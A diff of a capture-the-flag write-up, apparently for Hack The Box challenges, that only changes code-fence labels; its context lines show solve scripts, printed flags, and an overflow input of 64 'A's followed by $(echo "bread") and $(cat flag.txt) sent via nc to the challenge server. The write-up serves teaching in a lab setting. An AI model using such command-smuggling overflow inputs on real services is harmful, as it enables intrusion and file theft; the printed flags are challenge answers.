@@ -31,7 +31,7 @@ while u'Problem:' in x[1]:
         print (flag)
 ```
 
-```bash
+```shell
 bread@sticks:~#python3 solve.py
 TMHC{}
 ```
@@ -237,7 +237,7 @@ A couple of interesting things to note:
     - `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$(echo "bread")`
 - We then call `name` using `$name`
 
-```bash
+```shell
 bread@sticks:~# ./overdosed 
 Could you tell me about yourself?
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$(echo "bread")
@@ -248,7 +248,7 @@ Hello bread
 
 yep that works, guess the stack is set up how I expected. lets try it on the server.
 
-```bash
+```shell
 bread@sticks:~# nc docker.hackthebox.eu 1337
 Could you tell me about yourself?
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$(cat flag.txt)
@@ -413,7 +413,7 @@ print (f"TMHC{'{'+''.join(serial)+'}'}")
 ```
 
 and we get the flag:
-```bash
+```shell
 bread@sticks:~# python solve.py
 TMHC{5yjzx3d265gb7j}
 ```
